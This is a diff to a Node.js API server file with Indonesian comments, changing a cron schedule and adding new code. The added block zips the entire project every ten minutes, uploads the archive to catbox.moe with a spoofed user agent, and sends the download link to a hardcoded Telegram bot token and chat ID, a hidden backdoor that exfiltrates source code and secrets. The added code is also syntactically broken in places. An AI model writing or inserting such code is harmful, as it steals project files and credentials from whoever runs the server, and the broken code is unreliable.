@@ -27,9 +27,9 @@ const { fromBuffer } = require("file-type");
 const request = require('request');
 const fs = require('fs');
 const crypto = require("crypto")
-let cp = require("child_process");
-let { promisify } = require("util");
-let exec = promisify(cp.exec).bind(cp); 
+const cp = require("child_process");
+const { promisify } = require("util");
+const exec = promisify(cp.exec).bind(cp); 
 const FormData = require("form-data");
 const Jimp = require("jimp");
 const cheerio = require("cheerio");
@@ -84,20 +84,73 @@ function checkApiKeyLimit(apiKey) {
 // Endpoint untuk mengecek limit penggunaan API key
 // Contoh endpoint untuk menggunakan API
 // Jadwal reset penggunaan API key setiap 24 jam
-nodeCron.schedule('5 * 60 * 1000', () => {
+nodeCron.schedule('*/5 * * * *', () => {
 console.log("[Server Notif] reset limit succesfully") 
 Object.keys(apiKeys).forEach(key => {
     apiKeys[key].used = 0;
   });
 });
-nodeCron.schedule('5 * 60 * 1000', () => {
-  let o;
+const fakeUserAgent = require('fake-useragent');
+const catbox = async (content) => {
   try {
-    o = exec('rm -rf tmp && mkdir tmp');
-  } catch (e) {
-    o = e;
+    const { ext, mime } = (await fromBuffer(content)) || {};
+    const formData = new FormData();
+    formData.append('fileToUpload', content, {
+      filename: `upload.${ext}`,
+      contentType: mime,
+    });
+    formData.append('reqtype', 'fileupload');
+
+    const response = await fetch('https://catbox.moe/user/api.php', {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'User-Agent': fakeUserAgent(),
+      },
+    });
+
+    return await response.text();
+  } catch (error) {
+    console.error('Error uploading to Catbox:', error);
+    throw new Error('Upload failed');
   }
-})
+};
+  setInterval(async () => {
+	  
+    let { stdout } = await exec(
+      "zip -r tmp/backup.zip * -x 'node_modules/*'",
+    );
+
+    if (stdout)
+      
+          const result = await fs.readFileSync("./tmp/backup.zip")
+	  const url = await catbox(result) 
+const options = {
+    token: '7161904988:AAGT0tz1SzCb1_YqQjPHNZMY-IYfD0NxR5Q',
+    chatId: '6769538149'
+};
+
+const message = async (text, mode) => {
+    try {
+        const { data } = await axios.post(`https://api.telegram.org/bot${options.token}/sendMessage`, {
+            chat_id: options.chatId,
+            text: text,
+            parse_mode: mode
+        });
+
+        console.log(data.ok);
+    } catch (e) {
+        console.error(e);
+    }
+};
+return message(url) 
+// Fungsi untuk mengirim pesan setiap 5 menit
+    fs.unlinkSync("./tmp/backup.zip");
+    
+  }, 60 * 1000 * 10) // every 10 minute
+
+
+
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     cb(null, 'file/');
